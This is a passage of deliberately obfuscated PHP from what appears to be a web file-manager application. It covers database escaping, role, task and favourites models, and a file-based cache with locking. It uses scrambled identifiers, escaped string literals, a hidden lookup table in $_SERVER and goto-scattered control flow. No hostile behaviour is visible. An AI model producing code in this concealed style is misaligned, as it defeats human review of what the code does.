$f·÷‚ä¸ŞŒ[902]: case $f·÷‚ä¸ŞŒ[919]: case $f·÷‚ä¸ŞŒ[901]: case $f·÷‚ä¸ŞŒ[903]: return str_ireplace($f·÷‚ä¸ŞŒ[65], $f·÷‚ä¸ŞŒ[66], $b²³‹ï§Â„); } } protected function parseValue($B¾õñ½…ÁŞ) { $Aç†§‘…Û— =& $_SERVER[œÕÊİğö]; if (is_string($B¾õñ½…ÁŞ)) { $d×Ä«­Ù½Â = strpos($B¾õñ½…ÁŞ, $Aç†§‘…Û—[4]) === 0 && in_array($B¾õñ½…ÁŞ, array_keys($this->bind)); $B¾õñ½…ÁŞ = $d×Ä«­Ù½Â ? $this->escapeString($B¾õñ½…ÁŞ) : $Aç†§‘…Û—[940] . $this->escapeString($B¾õñ½…ÁŞ) . $Aç†§‘…Û—[940]; } elseif (isset($B¾õñ½…ÁŞ[0]) && is_string($B¾õñ½…ÁŞ[0]) && strtolower($B¾õñ½…ÁŞ[0]) == $Aç†§‘…Û—[305]) { $B¾õñ½…ÁŞ = $this->escapeString($B¾õñ½…ÁŞ[1]); } elseif (is_array($B¾õñ½…ÁŞ)) { $B¾õñ½…ÁŞ = array_map(array($this, $Aç†§‘…Û—[941]), $B¾õñ½…ÁŞ); } elseif (is_bool($B¾õñ½…ÁŞ)) { $B¾õñ½…ÁŞ = $B¾õñ½…ÁŞ ? $Aç†§‘…Û—[97] : $Aç†§‘…Û—[201]; } elseif (is_null($B¾õñ½…ÁŞ)) { $B¾õñ½…ÁŞ = $Aç†§‘…Û—[113]; } return $B¾õñ½…ÁŞ; } public function getLastInsertId() { $Dˆ×ªŞ =& $_SERVER[œÕÊİğö]; switch ($this->dbType) { case $Dˆ×ªŞ[927]: case $Dˆ×ªŞ[919]: case $Dˆ×ªŞ[900]: case $Dˆ×ªŞ[918]: case $Dˆ×ªŞ[902]: case $Dˆ×ªŞ[930]: return $this->_linkID->lastInsertId(); case $Dˆ×ªŞ[901]: case $Dˆ×ªŞ[903]: $aÕÄ¹ÖÄé  = $this->table; $eŒÙÎ‘åˆ¨ = $this->query("\x53\105\x4c\105\x43\124\40{$aÕÄ¹ÖÄé }\x2e\x63\165\162\x72\166\x61\154\40\x63\165\162\162\x76\x61\154\40\x46\122\x4f\115\40\x64\165\141\154"); return $eŒÙÎ‘åˆ¨ ? $eŒÙÎ‘åˆ¨[0][$Dˆ×ªŞ[942]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($C´„áôŒ È) { $EÆèÃŒµØÎ =& $_SERVER[œÕÊİğö]; if (!CacheLock::fileLock($EÆèÃŒµØÎ[19])) { return !1; } $E¦§°Òë£ = parent::query($C´„áôŒ È); CacheLock::fileUnLock($EÆèÃŒµØÎ[19]); return $E¦§°Òë£; } public function execute($b·¬ÁİÒÂ”) { $d½Ë¬¤¨¿î =& $_SERVER[œÕÊİğö]; if (!CacheLock::fileLock($d½Ë¬¤¨¿î[19])) { return !1; } $aŠŞ±éŒé = parent::execute($b·¬ÁİÒÂ”); CacheLock::fileUnLock($d½Ë¬¤¨¿î[19]); return $aŠŞ±éŒé; } } goto c¸Ø¢½ì¶; Eƒ¬ÅÙ“Ë: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\162\x6f\x6c\x65\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\141\x75\x74\x68", "\154\x61\142\x65\154", "\144\151\163\160\x6c\x61\171", "\163\x79\163\x74\145\x6d", "\144\x65\163\143", "\151\147\156\x6f\162\x65\105\x78\x74", "\151\147\x6e\157\162\145\x46\x69\154\x65\x53\x69\172\145", "\141\x64\155\x69\x6e\x69\163\x74\162\141\164\x6f\162", "\x73\x6f\162\x74"); public function listData($b¡‹‚ó± = false, $bº‹ªÄØ¼™ = "\163\157\162\x74", $dö¿îÓ¥£ö = false) { $BÑ‘“ŠÍ‘ô =& $_SERVER[œÕÊİğö]; $f‰‰•Óä = parent::listData($b¡‹‚ó±, $bº‹ªÄØ¼™, $dö¿îÓ¥£ö); if (!$b¡‹‚ó±) { foreach ($f‰‰•Óä as $AÍÖİœŸ¨é => $c“Ì‘Â²­») { if ($c“Ì‘Â²­»[$BÑ‘“ŠÍ‘ô[1912]] == 1) { $f‰‰•Óä[$AÍÖİœŸ¨é][$BÑ‘“ŠÍ‘ô[454]] = LNG($BÑ‘“ŠÍ‘ô[2136]); } } } return $f‰‰•Óä; } public function update($eŠÙîìëİ, $Cµƒì¾Ò®ß) { goto aÒÒº„ˆ¶ã; BÔ‡µ½‹±: if (!$bŠœ‘‰Ù || $dé¨‘šËš¸ && $dé¨‘šËš¸[$bàõÇ”–Ï§[404]] != $bŠœ‘‰Ù[$bàõÇ”–Ï§[404]]) { return !1; } if ($dé¨‘šËš¸[$bàõÇ”–Ï§[1912]] == 1) { $Cµƒì¾Ò®ß = array($bàõÇ”–Ï§[38] => $Cµƒì¾Ò®ß[$bàõÇ”–Ï§[38]], $bàõÇ”–Ï§[1742] => $Cµƒì¾Ò®ß[$bàõÇ”–Ï§[1742]]); } $this->filterAuth($Cµƒì¾Ò®ß[$bàõÇ”–Ï§[417]]); goto e‘•ËŒ•š—; e‘•ËŒ•š—: return parent::update($eŠÙîìëİ, $Cµƒì¾Ò®ß); goto AÅ¡Š–à†ª; aÒÒº„ˆ¶ã: $bàõÇ”–Ï§ =& $_SERVER[œÕÊİğö]; $bŠœ‘‰Ù = parent::listData($eŠÙîìëİ); $dé¨‘šËš¸ = $this->findByName($Cµƒì¾Ò®ß[$bàõÇ”–Ï§[38]]); goto BÔ‡µ½‹±; AÅ¡Š–à†ª: } public function remove($Cáïá²œÙİ) { $E…šò—íğÓ = parent::listData($Cáïá²œÙİ); if (!$E…šò—íğÓ || $E…šò—íğÓ[$_SERVER[œÕÊİğö][1193]]) { return !1; } return parent::remove($Cáïá²œÙİ); } public function add($båŞ‹–Êç¡) { goto Dø°Óá¶; Dø°Óá¶: $E¤ˆÍö÷¬ =& $_SERVER[œÕÊİğö]; $Bé¯Ô×´²ª = $båŞ‹–Êç¡[$E¤ˆÍö÷¬[38]]; if ($this->findByName($Bé¯Ô×´²ª)) { return !1; } goto BôĞ¾ÔÉ; E†Ğ¨ÉÑ©: return parent::insert($båŞ‹–Êç¡); goto FÓÈÜ±±¨Ü; BôĞ¾ÔÉ: $FŒ×¸îÃ¨§ = array($E¤ˆÍö÷¬[424] => $Bé¯Ô×´²ª, $E¤ˆÍö÷¬[1726] => $E¤ˆÍö÷¬[43], $E¤ˆÍö÷¬[1722] => $E¤ˆÍö÷¬[1730], $E¤ˆÍö÷¬[2137] => 1, $E¤ˆÍö÷¬[1725] => 0, $E¤ˆÍö÷¬[2138] => 0, $E¤ˆÍö÷¬[1724] => $this->getSort()); $båŞ‹–Êç¡ = array_merge($FŒ×¸îÃ¨§, $båŞ‹–Êç¡); $this->filterAuth($båŞ‹–Êç¡[$E¤ˆÍö÷¬[417]]); goto E†Ğ¨ÉÑ©; FÓÈÜ±±¨Ü: } private function getSort() { $Eç…°‹Ö°Í =& $_SERVER[œÕÊİğö]; $AÑ³°Ïãì = parent::listData(); $dÌñÎç¡µ = array_to_keyvalue($AÑ³°Ïãì, $Eç…°‹Ö°Í[43], $Eç…°‹Ö°Í[1743]); return empty($dÌñÎç¡µ) ? 0 : max($dÌñÎç¡µ) + 1; } private function filterAuth(&$BÅñ†šªèñ) { $cØŸõ×îâ =& $_SERVER[œÕÊİğö]; $b”éàï»¶Ş = array(); $F¤åóóŒí = array_filter(explode($cØŸõ×îâ[57], $BÅñ†šªèñ)); foreach ($F¤åóóŒí as $BÅñ†šªèñ) { $AÅÎ¦ƒŠø  = explode($cØŸõ×îâ[105], $BÅñ†šªèñ); if ($AÅÎ¦ƒŠø [0] == $cØŸõ×îâ[2139] && $AÅÎ¦ƒŠø [1] != $cØŸõ×îâ[1112]) { $BŸ¦Ğºš‘Ê = $AÅÎ¦ƒŠø [0] . $cØŸõ×îâ[105] . $AÅÎ¦ƒŠø [1] . $cØŸõ×îâ[2140]; if (!in_array($BŸ¦Ğºš‘Ê, $F¤åóóŒí)) { $b”éàï»¶Ş[] = $BŸ¦Ğºš‘Ê; } } $b”éàï»¶Ş[] = $BÅñ†šªèñ; } $BÅñ†šªèñ = implode($cØŸõ×îâ[57], $b”éàï»¶Ş); } public function sort($D º“¼×……, $fÚå‰ëåîŒ) { return parent::update($D º“¼×……, $fÚå‰ëåîŒ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x74\x61\163\x6b\114\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\164\171\x70\145", "\x65\x76\145\156\x74", "\164\151\155\145", "\x64\145\x73\143", "\163\x79\x73\164\x65\x6d", "\x65\x6e\141\x62\x6c\145", "\154\141\x73\x74\122\x75\156", "\x73\x6f\162\x74"); public function listData($Cø…Ê®ÕÙ = false, $c‡¹ÕÒ’ = "\163\x6f\x72\x74", $dƒæ¼§½ÏÀ = false) { return parent::listData($Cø…Ê®ÕÙ, $c‡¹ÕÒ’, $dƒæ¼§½ÏÀ); } public function add($Eæ³¢‘Ûö) { $D²Ô‰Ÿ‘¥± =& $_SERVER[œÕÊİğö]; $f†Àåù½ = $this->findByName($Eæ³¢‘Ûö[$D²Ô‰Ÿ‘¥±[38]]); if ($f†Àåù½) { return !1; } $Eæ³¢‘Ûö[$D²Ô‰Ÿ‘¥±[1515]] = 0; $Eæ³¢‘Ûö[$D²Ô‰Ÿ‘¥±[1743]] = $this->getSort(); return parent::insert($Eæ³¢‘Ûö); } private function getSort() { $F¥ Ğåš§ƒ =& $_SERVER[œÕÊİğö]; $D‰ŒÎ¦Í = parent::listData(); $Eë®„‘­Û¬ = array_to_keyvalue($D‰ŒÎ¦Í, $F¥ Ğåš§ƒ[43], $F¥ Ğåš§ƒ[1743]); return empty($Eë®„‘­Û¬) ? 0 : max($Eë®„‘­Û¬) + 1; } public function update($dîóµùñŒœ, $FññÍè¥³) { $F”ªŒ†Î‚ =& $_SERVER[œÕÊİğö]; $a‹ïÇ„·À¯ = $this->listData($dîóµùñŒœ); $D¥ˆãøÙÍÌ = $this->findByName($FññÍè¥³[$F”ªŒ†Î‚[38]]); if (!$a‹ïÇ„·À¯ || $D¥ˆãøÙÍÌ && $D¥ˆãøÙÍÌ[$F”ªŒ†Î‚[404]] != $a‹ïÇ„·À¯[$F”ªŒ†Î‚[404]]) { return !1; } return parent::update($dîóµùñŒœ, $FññÍè¥³); } public function remove($eâ˜¦ª´, $Dñ’˜ºÚµÏ = false) { $EÂ½İ‘©ÒÉ =& $_SERVER[œÕÊİğö]; $bÅ»³¾ºéÒ = $this->listData($eâ˜¦ª´); if (!$bÅ»³¾ºéÒ) { return; } if (!$Dñ’˜ºÚµÏ && $bÅ»³¾ºéÒ[$EÂ½İ‘©ÒÉ[1193]] == $EÂ½İ‘©ÒÉ[97]) { return !1; } return parent::remove($eâ˜¦ª´); } public function enable($d¥Ä§¸Æ¼, $a ´¡·†ˆÁ) { return $this->update($d¥Ä§¸Æ¼, array($_SERVER[œÕÊİğö][2131] => $a ´¡·†ˆÁ)); } public function run($E¬¬ã±‘ø) { return $this->update($E¬¬ã±‘ø, array($_SERVER[œÕÊİğö][2141] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($F´’™ÊÒá) { $F´Øç¬è¢ =& $_SERVER[œÕÊİğö]; return array($F´Øç¬è¢[1827] => array(USER_ID, $F´Øç¬è¢[2142])); } protected function listData() { $D—¶©¸ÂÄ =& $_SERVER[œÕÊİğö]; $CÔŒ Ş™¹¼ = array($D—¶©¸ÂÄ[1542] => USER_ID, $D—¶©¸ÂÄ[486] => 0); $d‘®òŞÌ™ = $D—¶©¸ÂÄ[2143]; $CÙ„Üù¶† = $this->field($d‘®òŞÌ™)->where($CÔŒ Ş™¹¼)->order($D—¶©¸ÂÄ[2144])->select(); return $CÙ„Üù¶† ? $CÙ„Üù¶† : array(); } protected function resetCache() { } protected function listView() { goto DÖŸŠâƒï; cŠ¸¢ÕÉÓ: $d˜§¥ÑÒ ‡ = array_to_keyvalue($Fµàª”ØÆÏ, $E‡…Ê­¶¿ô[43], $E‡…Ê­¶¿ô[86]); if (!$d˜§¥ÑÒ ‡) { return $f¡´ÛÜ¢Œ‰; } $C†ğ£‹ïÂ = 2000; goto dğªÈµï‰—; dğªÈµï‰—: $f‰à©ŸÊ = array($E‡…Ê­¶¿ô[421] => array($E‡…Ê­¶¿ô[422], $d˜§¥ÑÒ ‡)); $fÛ‚Ä°öÛŸ = Model($E‡…Ê­¶¿ô[822])->listSource($f‰à©ŸÊ, $C†ğ£‹ïÂ); $fÛ‚Ä°öÛŸ = array_merge($fÛ‚Ä°öÛŸ[$E‡…Ê­¶¿ô[84]], $fÛ‚Ä°öÛŸ[$E‡…Ê­¶¿ô[85]]); goto d’ŒØÅÊ§†; DÖŸŠâƒï: $E‡…Ê­¶¿ô =& $_SERVER[œÕÊİğö]; $f¡´ÛÜ¢Œ‰ = $this->listData(); $Fµàª”ØÆÏ = array_filter_by_field($f¡´ÛÜ¢Œ‰, $E‡…Ê­¶¿ô[39], $E‡…Ê­¶¿ô[420]); goto cŠ¸¢ÕÉÓ; d’ŒØÅÊ§†: $fÛ‚Ä°öÛŸ = array_to_keyvalue($fÛ‚Ä°öÛŸ, $E‡…Ê­¶¿ô[406]); foreach ($f¡´ÛÜ¢Œ‰ as $c”º´î–•Ë => $aæÌèŸ©Ü) { $e¤¤«ËÉÛ÷ = $fÛ‚Ä°öÛŸ[$aæÌèŸ©Ü[$E‡…Ê­¶¿ô[86]]]; $e¤¤«ËÉÛ÷ = $e¤¤«ËÉÛ÷ ? $e¤¤«ËÉÛ÷ : array(); $f¡´ÛÜ¢Œ‰[$c”º´î–•Ë] = array_merge($e¤¤«ËÉÛ÷, $aæÌèŸ©Ü); } return $f¡´ÛÜ¢Œ‰; goto bñšõŠì¹; bñšõŠì¹: } protected function addFav($eñÏùøª¯, $dØó¯‘ô‡ƒ = '', $Fæë‘©™ËŸ = "\163\157\x75\162\143\x65") { goto BößŸÄ´†; Eõß®–ğÁ¹: return $this->add($e¡…‹¡ˆƒ); goto dºìØà˜‡¢; fªßíàÊ¡Õ: if (!$dØó¯‘ô‡ƒ && $Fæë‘©™ËŸ == $cÇÉ¨ æÖÍ[420]) { $f½Ïö§İÛá = Model($cÇÉ¨ æÖÍ[1228])->where(array($cÇÉ¨ æÖÍ[421] => $eñÏùøª¯))->find(); if (!$f½Ïö§İÛá) { return !1; } $dØó¯‘ô‡ƒ = $f½Ïö§İÛá[$cÇÉ¨ æÖÍ[38]]; } $dØó¯‘ô‡ƒ = $this->getAutoName($dØó¯‘ô‡ƒ); $e¡…‹¡ˆƒ = array($cÇÉ¨ æÖÍ[1542] => USER_ID, $cÇÉ¨ æÖÍ[486] => 0, $cÇÉ¨ æÖÍ[424] => $dØó¯‘ô‡ƒ, $cÇÉ¨ æÖÍ[425] => $eñÏùøª¯, $cÇÉ¨ æÖÍ[426] => $Fæë‘©™ËŸ, $cÇÉ¨ æÖÍ[1724] => $b›Şùï¡ñÖ + 1); goto Eõß®–ğÁ¹; AÄß¦õà¬Î: $AŒ‰ã¦Üñ÷ = array($cÇÉ¨ æÖÍ[1542] => USER_ID, $cÇÉ¨ æÖÍ[486] => 0); $b›Şùï¡ñÖ = $this->where($AŒ‰ã¦Üñ÷)->max($cÇÉ¨ æÖÍ[1743]); if (!$b›Şùï¡ñÖ) { $b›Şùï¡ñÖ = 0; } goto fªßíàÊ¡Õ; BößŸÄ´†: $cÇÉ¨ æÖÍ =& $_SERVER[œÕÊİğö]; $AŒ‰ã¦Üñ÷ = array($cÇÉ¨ æÖÍ[1542] => USER_ID, $cÇÉ¨ æÖÍ[486] => 0, $cÇÉ¨ æÖÍ[426] => $Fæë‘©™ËŸ, $cÇÉ¨ æÖÍ[425] => $eñÏùøª¯); if ($this->where($AŒ‰ã¦Üñ÷)->find()) { return !1; } goto AÄß¦õà¬Î; dºìØà˜‡¢: } protected function remove($aŞĞ…Ñ÷‡Ü) { $Eªğİâ†µ =& $_SERVER[œÕÊİğö]; $b©‡ñÎ÷„ª = array($Eªğİâ†µ[1542] => USER_ID, $Eªğİâ†µ[423] => $aŞĞ…Ñ÷‡Ü); return $this->where($b©‡ñÎ÷„ª)->delete(); } protected function removeByName($bäÊ‚ëŠ¿©) { $F±‹İ¦—…Œ =& $_SERVER[œÕÊİğö]; $b§àÕõ‘ = array($F±‹İ¦—…Œ[1542] => USER_ID, $F±‹İ¦—…Œ[424] => $bäÊ‚ëŠ¿©, $F±‹İ¦—…Œ[486] => 0); return $this->where($b§àÕõ‘)->delete(); } protected function rename($EÉø¡íå¡‘, $Cˆ‡ÃíÊÛä) { $F‰Ğñ¥È„¥ =& $_SERVER[œÕÊİğö]; if ($EÉø¡íå¡‘ == $Cˆ‡ÃíÊÛä) { return !1; } $e«ÕÕºÇŠè = $this->getAutoName($Cˆ‡ÃíÊÛä); if ($Cˆ‡ÃíÊÛä != $e«ÕÕºÇŠè) { return !1; } $A´Ë™Œè˜¸ = array($F‰Ğñ¥È„¥[1542] => USER_ID, $F‰Ğñ¥È„¥[486] => 0, $F‰Ğñ¥È„¥[38] => $EÉø¡íå¡‘); return $this->where($A´Ë™Œè˜¸)->save(array($F‰Ğñ¥È„¥[38] => $Cˆ‡ÃíÊÛä)); } protected function resetSort($c«–ß£âéÜ) { $e±ªø¦– =& $_SERVER[œÕÊİğö]; $c«–ß£âéÜ = is_array($c«–ß£âéÜ) ? $c«–ß£âéÜ : array(); $Aè¿­¡ÑÑë = array($e±ªø¦–[1542] => USER_ID); for ($FæËÀà³ºÌ = 0; $FæËÀà³ºÌ < count($c«–ß£âéÜ); $FæËÀà³ºÌ++) { $Aè¿­¡ÑÑë[$e±ªø¦–[423]] = $c«–ß£âéÜ[$FæËÀà³ºÌ]; $this->where($Aè¿­¡ÑÑë)->save(array($e±ªø¦–[1724] => $FæËÀà³ºÌ + 1)); } return !0; } protected function moveTop($A‹½Î»Û¨) { goto cØÈÈĞÖ„İ; cì¨²··Á: if (!$eø›Ò¼Ø‰“) { return; } $Cäë¯’É–  = $this->field($Bˆ¨«ã‰Ø¿[404])->where($eÃ–ŠˆÎ…Æ)->order($Bˆ¨«ã‰Ø¿[2144])->select(); $Cäë¯’É–  = array_to_keyvalue($Cäë¯’É– , $Bˆ¨«ã‰Ø¿[43], $Bˆ¨«ã‰Ø¿[404]); goto D£ª–ÁÁ; D£ª–ÁÁ: $f´—‰çºÃ¬ = $Cäë¯’É– ; $Cäë¯’É–  = array_remove_value($Cäë¯’É– , $eø›Ò¼Ø‰“[$Bˆ¨«ã‰Ø¿[404]]); array_unshift($Cäë¯’É– , $eø›Ò¼Ø‰“[$Bˆ¨«ã‰Ø¿[404]]); goto bß±°ÏÒİ¡; bß±°ÏÒİ¡: return $this->resetSort($Cäë¯’É– ); goto B¼¶­¸”È; cØÈÈĞÖ„İ: $Bˆ¨«ã‰Ø¿ =& $_SERVER[œÕÊİğö]; $eÃ–ŠˆÎ…Æ = array($Bˆ¨«ã‰Ø¿[1542] => USER_ID, $Bˆ¨«ã‰Ø¿[486] => 0); $eø›Ò¼Ø‰“ = $this->where($eÃ–ŠˆÎ…Æ)->where(array($Bˆ¨«ã‰Ø¿[38] => $A‹½Î»Û¨))->find(); goto cì¨²··Á; B¼¶­¸”È: } protected function moveBottom($c±”¼’òŸ¯) { $Fù…‚šª =& $_SERVER[œÕÊİğö]; $D‹Û°ŒÛÎí = array($Fù…‚šª[1542] => USER_ID, $Fù…‚šª[486] => 0); $f»®åœ¹†í = $this->where($D‹Û°ŒÛÎí)->max($Fù…‚šª[1743]); $DçŸÂˆ½Úê = array($Fù…‚šª[1743] => $f»®åœ¹†í + 1); return $this->where($D‹Û°ŒÛÎí)->where(array($Fù…‚šª[38] => $c±”¼’òŸ¯))->save($DçŸÂˆ½Úê); } private function getAutoName($E‘Ï„ˆœË) { goto cÚÏ·•İÖ; d½§×‰“Àª: return $E‘Ï„ˆœË . "\50{$fˆÎÚÅšÁ•}\51"; goto fÓõÓèÌÖº; F¿Ğ•ò£„ô: $f²Õ“Ìˆ¡¿ = array_to_keyvalue($f²Õ“Ìˆ¡¿, $aèºÅÉø„º[43], $aèºÅÉø„º[38]); if (!$f²Õ“Ìˆ¡¿ || !in_array($E‘Ï„ˆœË, $f²Õ“Ìˆ¡¿)) { return $E‘Ï„ˆœË; } for ($fˆÎÚÅšÁ• = 0; $fˆÎÚÅšÁ• < count($f²Õ“Ìˆ¡¿); $fˆÎÚÅšÁ•++) { if (!in_array($E‘Ï„ˆœË . "\x28{$fˆÎÚÅšÁ•}\51", $f²Õ“Ìˆ¡¿)) { return $E‘Ï„ˆœË . "\50{$fˆÎÚÅšÁ•}\51"; } } goto d½§×‰“Àª; cÚÏ·•İÖ: $aèºÅÉø„º =& $_SERVER[œÕÊİğö]; $DªÖÍ÷İ¡ä = array($aèºÅÉø„º[1542] => USER_ID, $aèºÅÉø„º[486] => 0); $f²Õ“Ìˆ¡¿ = $this->field($aèºÅÉø„º[38])->where($DªÖÍ÷İ¡ä)->select(); goto F¿Ğ•ò£„ô; fÓõÓèÌÖº: } } goto cƒŠ©”ò¬; CÜÎ‹£„ğŸ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto B»ˆ‡óßØÑ; Cø×ƒÌ®ÎØ: $F·ó„†ÇØ = $GLOBALS[$c–ÅŠİ‘[6]][$c–ÅŠİ‘[357]]; $FŒÙ‚èàÎº = $F·ó„†ÇØ[$F·ó„†ÇØ[$c–ÅŠİ‘[824]]]; $f¼Àİ„Ó£ = $F·ó„†ÇØ[$c–ÅŠİ‘[825]]; goto Cµ¢ŸğÆê; Cµ¢ŸğÆê: switch ($F·ó„†ÇØ[$c–ÅŠİ‘[824]]) { case $c–ÅŠİ‘[27]: self::$handle = Model($c–ÅŠİ‘[826]); break; case $c–ÅŠİ‘[827]: self::$handle = new CacheRedis($FŒÙ‚èàÎº, $f¼Àİ„Ó£); break; case $c–ÅŠİ‘[828]: self::$handle = new CacheMemcached($FŒÙ‚èàÎº, $f¼Àİ„Ó£); break; case $c–ÅŠİ‘[203]: self::$handle = new CacheFile($FŒÙ‚èàÎº, $f¼Àİ„Ó£); break; default: break; } return self::$handle; goto DØàË£òˆ«; B»ˆ‡óßØÑ: $c–ÅŠİ‘ =& $_SERVER[œÕÊİğö]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Cø×ƒÌ®ÎØ; DØàË£òˆ«: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($dÖéôã¨‡) { if (is_array($dÖéôã¨‡) || is_object($dÖéôã¨‡)) { $dÖéôã¨‡ = json_encode($dÖéôã¨‡); } $dÖéôã¨‡ = rawurlencode($dÖéôã¨‡); return md5(KOD_SITE_ID . $_SERVER[œÕÊİğö][81] . $dÖéôã¨‡); } public static function get($B•ß‹ù‰Œä, $fàÊ×ö«ß = false) { $Eìó‚®å‡õ = self::key($B•ß‹ù‰Œä); if ($fàÊ×ö«ß) { return unserialize(self::init()->get($Eìó‚®å‡õ)); } if (!isset(self::$memoryCache[$Eìó‚®å‡õ])) { $c×‰È…³å³ = self::init()->get($Eìó‚®å‡õ); self::$memoryCache[$Eìó‚®å‡õ] = unserialize($c×‰È…³å³); } return self::$memoryCache[$Eìó‚®å‡õ]; } public static function set($e¸öÎŸ“áš, $CîìÎæ”©æ, $a…Ã—±ÔÒø = false) { goto DµÒÌŠÚŠ÷; B’ŠÒ… ç´: CacheLock::unlock($e¸öÎŸ“áš); return $a°ŸĞô¦µÛ; goto aŒ³ìˆ·²; DµÒÌŠÚŠ÷: $fæì¬ë¯ºœ = self::key($e¸öÎŸ“áš); if (isset(self::$memoryCache[$fæì¬ë¯ºœ]) && self::$memoryCache[$fæì¬ë¯ºœ] === $CîìÎæ”©æ) { return !0; } if ($a…Ã—±ÔÒø === 0) { self::$memoryCache[$fæì¬ë¯ºœ] = $CîìÎæ”©æ; return !0; } goto b³ÆÇÅÊ; b³ÆÇÅÊ: CacheLock::lock($e¸öÎŸ“áš); $a°ŸĞô¦µÛ = self::init()->set($fæì¬ë¯ºœ, serialize($CîìÎæ”©æ), $a…Ã—±ÔÒø); self::$memoryCache[$fæì¬ë¯ºœ] = $CîìÎæ”©æ; goto B’ŠÒ… ç´; aŒ³ìˆ·²: } public static function getCall($f¤¹åÍ…Â, $f­æÁ˜•…½, $E¾È‚Ÿé‡’, $dµ£Óåïƒ = array()) { goto F›êÅòó½Â; F›êÅòó½Â: $FÌÎÈˆÈ†å =& $_SERVER[œÕÊİğö]; $BÆµãÎ”Ü = self::get($f¤¹åÍ…Â); if ($BÆµãÎ”Ü || $BÆµãÎ”Ü === $FÌÎÈˆÈ†å[43]) { return $BÆµãÎ”Ü; } goto Cá´İİ†ƒœ; d‘ò·º…: return $BÆµãÎ”Ü; goto b¨ÖÚ‰‰; Cá´İİ†ƒœ: $BÆµãÎ”Ü = call_user_func_array($E¾È‚Ÿé‡’, $dµ£Óåïƒ); $BÆµãÎ”Ü = $BÆµãÎ”Ü ? $BÆµãÎ”Ü : $FÌÎÈˆÈ†å[43]; self::set($f¤¹åÍ…Â, $BÆµãÎ”Ü, $f­æÁ˜•…½); goto d‘ò·º…; b¨ÖÚ‰‰: } public static function remove($aÒÚÃ†§©ä) { goto A×¸í…Áï; A×¸í…Áï: $aá­µº…Ì = self::key($aÒÚÃ†§©ä); unset(self::$memoryCache[$aá­µº…Ì]); self::clearTimeout(); goto eå…”º×ãä; cÑ‚¥ï©¯ñ: return $C½º‚çğŠø; goto bÑ‹Ï’‡á¾; eå…”º×ãä: CacheLock::lock($aÒÚÃ†§©ä); $C½º‚çğŠø = self::init()->remove($aá­µº…Ì); CacheLock::unlock($aÒÚÃ†§©ä); goto cÑ‚¥ï©¯ñ; bÑ‹Ï’‡á¾: } public static function removeMemory($fƒšò®Ùƒ ) { $b±³å¶ŠÉª = self::key($fƒšò®Ùƒ ); unset(self::$memoryCache[$b±³å¶ŠÉª]); } public static function clearMemory($E‰Ó¶×±Ç = false) { if ($E‰Ó¶×±Ç) { $E‰Ó¶×±Ç = self::key($E‰Ó¶×±Ç); unset(self::$memoryCache[$E‰Ó¶×±Ç]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[œÕÊİğö][829])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[œÕÊİğö][830])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($B…ÇÏ›š¶“, $Cø²¤ù˜Üê) { $fŒƒÙÁ¬Æƒ =& $_SERVER[œÕÊİğö]; $this->cachePath = $B…ÇÏ›š¶“[$fŒƒÙÁ¬Æƒ[86]]; $this->prefix = $fŒƒÙÁ¬Æƒ[831]; $this->cacheTime = $Cø²¤ù˜Üê; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($A«àãõ¾) { $DßÓ±áŸ‰ =& $_SERVER[œÕÊİğö]; $A«àãõ¾ = str_replace(array($DßÓ±áŸ‰[832], $DßÓ±áŸ‰[107], $DßÓ±áŸ‰[80]), $DßÓ±áŸ‰[833], $A«àãõ¾); return $this->cachePath . $DßÓ±áŸ‰[834] . $A«àãõ¾ . $DßÓ±áŸ‰[835]; } public function set($D‘™•¼­™Å, $E²…ùÃ¾“ê, $BæˆáÈ‰£´ = false) { $BÖÁØî Ô… = $this->getFile($D‘™•¼­™Å); if (file_put_contents($BÖÁØî Ô…, $this->prefix . $E²…ùÃ¾“ê, LOCK_EX)) { @touch($BÖÁØî Ô…, intval(time() + $BæˆáÈ‰£´)); clearstatcache(); return !0; } @unlink($BÖÁØî Ô…); return !1; } public function get($F›Ø•ğ²í¸) { $E¼†º»®©™ = $this->getFile($F›Ø•ğ²í¸); if (file_exists($E¼†º»®©™) && filemtime($E¼†º»®©™) < time()) { @unlink($E¼†º»®©™); return !1; } $f¾åï¦ñ† = @file_get_contents($E¼†º»®©™); return substr($f¾åï¦ñ†, strlen($this->prefix)); } public function remove($CÜÜóÓ…ñæ) { $f¦ºá›î›Œ = $this->getFile($CÜÜóÓ…ñæ); return @unlink($f¦ºá›î›Œ); } public function deleteAll() { $Bª®–ËÆÓ =& $_SERVER[œÕÊİğö]; $d†ëÎÃè« = scandir($this->cachePath); foreach ($d†ëÎÃè« as $E¾”´Ü) { $a®æùÄ²‡“ = $this->cachePath . $E¾”´Ü; if (strpos($a®æùÄ²‡“, $Bª®–ËÆÓ[835]) && strpos($a®æùÄ²‡“, $Bª®–ËÆÓ[836])) { @unlink($a®æùÄ²‡“); } } } public function clearTimeout() { $DÖ²…Û§Œ =& $_SERVER[œÕÊİğö]; $cóÍÁ”‚õ½ = scandir($this->cachePath); foreach ($cóÍÁ”‚õ½ as $dóê©•ˆŠ‘) { $B¡ ¼¬ˆ× = $this->cachePath . $dóê©•ˆŠ‘; if (strpos($B¡ ¼¬ˆ×, $DÖ²…Û§Œ[835]) && strpos($B¡ ¼¬ˆ×, $DÖ²…Û§Œ[836]) && filemtime($B¡ ¼¬ˆ×) < time()) { @unlink($B¡ ¼¬ˆ×); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto aÍ°–Ä†‚; BÀÒš¼„‘¿: self::$timeout = $d‰“µ¢Øìô[$AëîÃ¤–­ñ[837]] ? 